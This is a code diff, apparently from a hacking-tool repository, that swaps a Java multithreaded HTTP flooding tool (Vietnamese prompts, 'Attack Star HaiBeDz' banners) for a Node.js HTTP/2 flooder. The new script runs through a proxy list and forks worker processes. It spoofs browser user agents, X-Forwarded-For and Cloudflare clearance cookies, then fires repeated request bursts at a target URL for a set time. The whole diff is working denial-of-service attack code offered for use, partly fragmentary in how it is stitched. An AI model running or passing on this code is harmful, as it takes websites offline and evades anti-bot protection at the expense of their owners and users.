+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
+"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
+"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",     "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
+"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
+"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
+"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
+"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
+"Mozilla/5.0 (Linux; Android 12; V2120 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36"
+ ];
 
-    private final String USER_AGENT =   "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1";
+ version = [
+    '"Chromium";v="100", "Google Chrome";v="100"',
+    '"(Not(A:Brand";v="8", "Chromium";v="98"',
+    '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
+    '"Not_A Brand";v="8", "Google Chrome";v="109", "Chromium";v="109"',
+    '"Not_A Brand";v="99", "Google Chrome";v="86", "Chromium";v="86"',
+    '"Not_A Brand";v="99", "Google Chrome";v="96", "Chromium";v="96"',
+    '"Not A;Brand";v="99", "Chromium";v="96", "Microsoft Edge";v="96"'
+ ];
 
-    private static int amount = 0;
-    private static String url = "";
-    int seq;
-    int type;
+  platform = [
+    //'Linux',
+    //'macOS',
+    'Windows'
+  ];
+  
+  site = [
+    'cross-site',
+	'same-origin',
+	'same-site',
+	'none'
+  ];
+  
+  mode = [
+    'cors',
+	'navigate',
+	'no-cors',
+	'same-origin'
+  ];
+  
+  dest = [
+    'document',
+	'image',
+	'embed',
+	'empty',
+	'frame'
+  ];
+  
+const rateHeaders = [
+{ "akamai-origin-hop": randstr(5)  },
+{ "source-ip": randstr(5)  },
+{ "via": randstr(5)  },
+{ "cluster-ip": randstr(5)  },
+];
+const rateHeaders2 = [
+{ "akamai-origin-hop": randstr(5)  },
+{ "source-ip": randstr(5)  },
+{ "via": randstr(5)  },
+{ "cluster-ip": randstr(5)  },
+];
 
-    public Dos(int seq, int type) {
-        this.seq = seq;
-        this.type = type;
+const useragentl = [
+ '(CheckSecurity 2_0)',
+ '(BraveBrowser 5_0)',
+ '(ChromeBrowser 3_0)',
+ '(ChromiumBrowser 4_0)',
+ '(AtakeBrowser 2_0)',
+ '(NasaChecker)',
+ '(CloudFlareIUAM)',
+ '(NginxChecker)',
+ '(AAPanel)',
+ '(AntiLua)',
+ '(FushLua)',
+ '(FBIScan)',
+ '(FirefoxTop)',
+ '(ChinaNet Bot)'
+];
+
+const mozilla = [
+ 'Mozilla/5.0 ',
+ 'Mozilla/6.0 ',
+ 'Mozilla/7.0 ',
+ 'Mozilla/8.0 ',
+ 'Mozilla/9.0 '
+];
+
+ var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
+ var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
+ var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
+ var ver = version[Math.floor(Math.floor(Math.random() * version.length))];
+ var az1 = useragentl[Math.floor(Math.floor(Math.random() * useragentl.length))];
+ var platforms = platform[Math.floor(Math.floor(Math.random() * platform.length))];
+ var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
+ var site1 = site[Math.floor(Math.floor(Math.random() * site.length))];
+ var moz = mozilla[Math.floor(Math.floor(Math.random() * mozilla.length))];
+ var mode1 = mode[Math.floor(Math.floor(Math.random() * mode.length))];
+ var dest1 = dest[Math.floor(Math.floor(Math.random() * dest.length))];
+ var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
+ var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
+ var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
+ var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
+ var proxies = readLines(args.proxyFile);
+ const parsedTarget = url.parse(args.target);
+
+ if (cluster.isMaster) {
+    for (let counter = 1; counter <= args.threads; counter++) {
+        cluster.fork();
     }
+} else {setInterval(runFlooder) }
+ 
+ class NetSocket {
+     constructor(){}
+ 
+  HTTP(options, callback) {
+     const parsedAddr = options.address.split(":");
+     const addrHost = parsedAddr[0];
+     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
+     const buffer = new Buffer.from(payload);
+ 
+     const connection = net.connect({
+         host: options.host,
+         port: options.port
+     });
+ 
+     //connection.setTimeout(options.timeout * 600000);
+     connection.setTimeout(options.timeout * 100000);
+     connection.setKeepAlive(true, 100000);
+ 
+     connection.on("connect", () => {
+         connection.write(buffer);
+     });
+ 
+     connection.on("data", chunk => {
+         const response = chunk.toString("utf-8");
+         const isAlive = response.includes("HTTP/1.1 200");
+         if (isAlive === false) {
+             connection.destroy();
+             return callback(undefined, "error: invalid response from proxy server");
+         }
+         return callback(connection, undefined);
+     });
+ 
+     connection.on("timeout", () => {
+         connection.destroy();
+         return callback(undefined, "error: timeout exceeded");
+     });
+ 
+     connection.on("error", error => {
+         connection.destroy();
+         return callback(undefined, "error: " + error);
+     });
+ }
+ }
 
-    public void run() {
-        try {
-            while (true) {
-                switch (this.type) {
-                    case 1:
-                        postAttack(Dos.url);
-                        break;
-                    case 2:
-                        sslPostAttack(Dos.url);
-                        break;
-                    case 3:
-                        getAttack(Dos.url);
-                        break;
-                    case 4:
-                        sslGetAttack(Dos.url);
-                        break;
+ const Socker = new NetSocket();
+ headers[":method"] = "GET";
+ headers[":authority"] = parsedTarget.host;
+ headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
+ headers[":scheme"] = "https";
+ headers["x-forwarded-proto"] = "https";
+ headers["cache-control"] = "no-cache";
+ headers["X-Forwarded-For"] = spoofed;
+ headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
+ headers["sec-ch-ua-mobile"] = "?0";
+ headers["sec-ch-ua-platform"] = "Windows";
+ headers["accept-language"] = lang;
+ headers["accept-encoding"] = encoding;
+ headers["upgrade-insecure-requests"] = "1";
+ headers["accept"] = accept;
+ headers["user-agent"] = moz + az1 + "TLC GAMER" + " Code:" + randstr(7);
+ headers["referer"] = Ref;
+ headers["sec-fetch-mode"] = "navigate";
+ headers["sec-fetch-dest"] = dest1;
+ headers["sec-fetch-user"] = "?1";
+ headers["TE"] = "trailers";
+ headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
+ headers["sec-fetch-site"] = site1;
+ headers["x-requested-with"] = "XMLHttpRequest";
+ 
+ function runFlooder() {
+     const proxyAddr = randomElement(proxies);
+     const parsedProxy = proxyAddr.split(":"); 
+         headers["origin"] = "https://" + parsedTarget.host;
 
+     const proxyOptions = {
+         host: parsedProxy[0],
+         port: ~~parsedProxy[1],
+         address: parsedTarget.host + ":443",
+         timeout: 300,
+     };
+
+     Socker.HTTP(proxyOptions, (connection, error) => {
+         if (error) return
+ 
+         connection.setKeepAlive(true, 200000);
+
+         const tlsOptions = {
+            secure: true,
+            ALPNProtocols: ['h2'],
+            //ALPNProtocols: ['h2','http/1.1','spdy/3.1'],
+            sigals: siga,
+            socket: connection,
+            ciphers: cipper,
+            ecdhCurve: "prime256v1:X25519",
+            host: parsedTarget.host,
+            rejectUnauthorized: false,
+            servername: parsedTarget.host,
+            //secureProtocol: "TLS_method",
+            secureProtocol: ["TLSv1_1_method", "TLS_method","TLSv1_2_method", "TLSv1_3_method",],
+        };
+
+         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
+
+         tlsConn.setKeepAlive(true, 60000);
+
+         const client = http2.connect(parsedTarget.href, {
+             protocol: "https:",
+             settings: {
+            headerTableSize: 65536,
+            maxConcurrentStreams: 10000,
+            initialWindowSize: 6291456,
+            maxHeaderListSize: 65536,
+            enablePush: false
+          },
+             maxSessionMemory: 64000,
+             maxDeflateDynamicTableSize: 4294967295,
+             createConnection: () => tlsConn,
+             socket: connection,
+         });
+ 
+         client.settings({
+            headerTableSize: 65536,
+            maxConcurrentStreams: 10000,
+            initialWindowSize: 6291456,
+            maxHeaderListSize: 65536,
+            enablePush: false
+          });
+
+     setInterval(() => {
+         client.on("connect", () => {
+              const dynHeaders = {
+                ...headers,
+                ...rateHeaders2[Math.floor(Math.random()*rateHeaders.length)],
+                ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)]
+              };
+                for (let i = 0; i < args.Rate; i++) {
+                    const request = client.request(dynHeaders)
+                    
+                    request.on("response", response => {
+                        //console.log("Response:", response);
+                        request.close();
+                        request.destroy();
+                        return
+                    });
+    
+                    request.end();
                 }
-            }
-        } catch (Exception e) {
-
-        }
-    }
-
-
-    public static void main(String[] args) throws Exception {
-        String url = "";
-        int attakingAmoun = 0;
-        Dos dos = new Dos(0, 0);
-        Scanner in = new Scanner(System.in);
-        System.out.print("Nhập URL Web Cần Bay👾: ");
-        url = in.nextLine();
-        System.out.println("\n");
-        System.out.println("Đang Check Mục Tiêu 🎯: " + url);
-
-        String[] SUrl = url.split("://");
-
-        System.out.println("Checking connection to Site");
-        if (SUrl[0] == "http" || SUrl[0].equals("http")) {
-            dos.checkConnection(url);
-        } else {
-            dos.sslCheckConnection(url);
-        }
-
-        System.out.println("Setting DDoS By: Trick Of Attack HaiBeDz🎀");
-
-        System.out.print("THEAR: ");
-        String amount = in.nextLine();
-
-        if (amount == null || amount.equals(null) || amount.equals("")) {
-            Dos.amount = 2000;
-        } else {
-            Dos.amount = Integer.parseInt(amount);
-        }
-
-        System.out.print("METHOND: ");
-        String option = in.nextLine();
-        int ioption = 1;
-        if (option == "get" || option == "GET") {
-            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
-                ioption = 3;
-            } else {
-                ioption = 4;
-            }
-        } else {
-            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
-                ioption = 1;
-            } else {
-                ioption = 2;
-            }
-        }
-
-        Thread.sleep(2000);
-
-
-        System.out.println("Attack Star ⭐ HaiBeDz");
-        ArrayList<Thread> threads = new ArrayList<Thread>();
-        for (int i = 0; i < Dos.amount; i++) {
-            Thread t = new Thread(new Dos(i, ioption));
-            t.start();
-            threads.add(t);
-        }
-
-        for (int i = 0; i < threads.size(); i++) {
-            Thread t = threads.get(i);
-            try {
-                t.join();
-            } catch (Exception e) {
-
-            }
-        }
-        System.out.println("Main Thread ended");
-    }
-
-    private void checkConnection(String url) throws Exception {
-        System.out.println("Checking Connection");
-        URL obj = new URL(url);
-        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
-        con.setRequestMethod("GET");
-        con.setRequestProperty("User-Agent", USER_AGENT);
-
-        int responseCode = con.getResponseCode();
-        if (responseCode == 200) {
-            System.out.println("Connected to website");
-        }
-        Dos.url = url;
-    }
-
-    private void sslCheckConnection(String url) throws Exception {
-        System.out.println("Checking Connection (ssl)");
-        URL obj = new URL(url);
-        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
-        con.setRequestMethod("GET");
-        con.setRequestProperty("User-Agent", USER_AGENT);
-
-        int responseCode = con.getResponseCode();
-        if (responseCode == 200) {
-            System.out.println("Connected to website");
-        }
-        Dos.url = url;
-    }
-
-    private void postAttack(String url) throws Exception {
-        URL obj = new URL(url);
-        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
-        con.setRequestMethod("POST");
-        con.setRequestProperty("User-Agent", USER_AGENT);
-        con.setRequestProperty("Accept-Language", "en-US,en;");
-        String urlParameters = "out of memory";
-
-        con.setDoOutput(true);
-        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
-        wr.writeBytes(urlParameters);
-        wr.flush();
-        wr.close();
-        int responseCode = con.getResponseCode();
-        System.out.println("GET Attack DDoS !: " + responseCode + "Thread: " + this.seq);
-    }
-
-    private void getAttack(String url) throws Exception {
-        URL obj = new URL(url);
-        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
-        con.setRequestMethod("GET");
-        con.setRequestProperty("User-Agent", USER_AGENT);
-
-        int responseCode = con.getResponseCode();
-        System.out.println(" GET Attack DDoS !: " + responseCode + "Thread: " + this.seq);
-    }
-
-    private void sslPostAttack(String url) throws Exception {
-        URL obj = new URL(url);
-        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
-        con.setRequestMethod("GET");
-        con.setRequestProperty("User-Agent", USER_AGENT);
-        con.setRequestProperty("Accept-Language", "en-US,en;");
-        String urlParameters = "out of memory";
-
-        con.setDoOutput(true);
-        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
-        wr.writeBytes(urlParameters);
-        wr.flush();
-        wr.close();
-        int responseCode = con.getResponseCode();
-        System.out.println(" GET Attack DDoS !:" + responseCode + "Thread: " + this.seq);
-    }
-
-    private void sslGetAttack(String url) throws Exception {
-        URL obj = new URL(url);
-        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
-        con.setRequestMethod("GET");
-        con.setRequestProperty("User-Agent", USER_AGENT);
-
-        int responseCode = con.getResponseCode();
-        System.out.println(" GET Attack DDoS !: " + responseCode + "Thread: " + this.seq);
-    }
-}
+            }); 
+         });
+ 
+         client.on("close", () => {
+             client.destroy();
+             connection.destroy();
+             return
+         });
+     }),function (error, response, body) {
+		};
+ }
+ 
+ const KillScript = () => process.exit(1);
+ 
+ setTimeout(KillScript, args.time * 1000);
